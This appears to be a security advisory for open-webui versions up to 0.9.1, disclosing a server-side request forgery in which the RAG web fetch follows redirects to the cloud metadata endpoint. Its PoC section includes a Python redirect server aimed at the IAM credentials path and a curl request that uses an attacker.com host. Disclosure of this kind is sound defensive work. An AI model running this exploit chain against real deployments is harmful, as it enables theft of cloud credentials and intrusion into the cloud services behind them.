# SSRF via Redirect Following in RAG Web Fetch Enables Cloud Credential Theft

**Package:** open-webui (pip) / ghcr.io/open-webui/open-webui (Docker)
**Affected versions:** <= 0.9.1
**Severity:** High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (8.5)

## Summary

`requests.get()` in the RAG web fetch endpoint follows HTTP 302 redirects without re-validating the destination IP. Any verified user can submit a URL pointing to an attacker-controlled server that responds with a 302 redirect to a cloud IMDS endpoint (`169.254.169.254`). The initial URL passes `validate_url()` (public IP), but the redirect target is never checked. On AWS/GCP/Azure deployments, this leaks IAM role credentials to the attacker.

## Details

**Vulnerable code — `backend/open_webui/retrieval/utils.py:182`:**

```python
response = requests.get(url, stream=True, timeout=30)
# allow_redirects defaults to True — follows 302 without re-validating destination
```

**URL validation — `backend/open_webui/utils/misc.py:61,65`:**

```python
# is_string_allowed() uses str.endswith() against the full URL string, not parsed hostname
if any(s.endswith(blocked) for s in strings for blocked in block_list):
    return False
```

`validate_url()` checks the initial URL's resolved IP against private ranges and the hostname against a blocklist. But `requests.get()` follows redirects transparently — the redirect target (`169.254.169.254`) is never passed through `validate_url()`.

**Inconsistency:** `SafeWebBaseLoader._fetch()` in the same codebase (`retrieval/web/utils.py:521`) correctly sets `allow_redirects=False`. The vulnerable `requests.get()` at `retrieval/utils.py:182` does not.

**Secondary issue:** `is_string_allowed()` applies `str.endswith()` to the full URL string. A blocklist entry like `169.254.169.254` only matches when the URL literally ends with that string; any trailing path (`/latest/meta-data/`) bypasses it. The hostname should be parsed with `urlparse().hostname` before comparison.

## PoC

```bash
# 1. Set up attacker redirect server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 9999), H).serve_forever()
"

# 2. As verified user, submit the redirect URL
curl -X POST http://localhost:8080/api/v1/retrieval/process/web \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://attacker.com:9999/redir", "collection_name": "test"}'
# Server follows 302 to IMDS — returns IAM credentials in response
```

**Live-confirmed:** Redirect-following was confirmed using `https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A8080%2Fapi%2Fversion&status_code=302`. The server followed the 302 and returned internal content from `http://127.0.0.1:8080/api/version` (`{"version":"0.9.1"}`). Direct IMDS URLs are correctly blocked by `validate_url()` IP check — the vulnerability requires the redirect bypass.

Full PoC script: `exploit_ssrf_rag.py`

## Impact

Any verified user (not admin) can steal cloud IAM credentials on AWS, GCP, or Azure deployments, enabling lateral movement to S3, RDS, or other cloud services with the permissions of the EC2/VM instance role. Affects **all** deployments regardless of JWT secret configuration. CVSS 8.5 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`).

**Full audit report:** https://github.com/tempcollab/open-webui/blob/main/autofyn_audit/audit_report.md
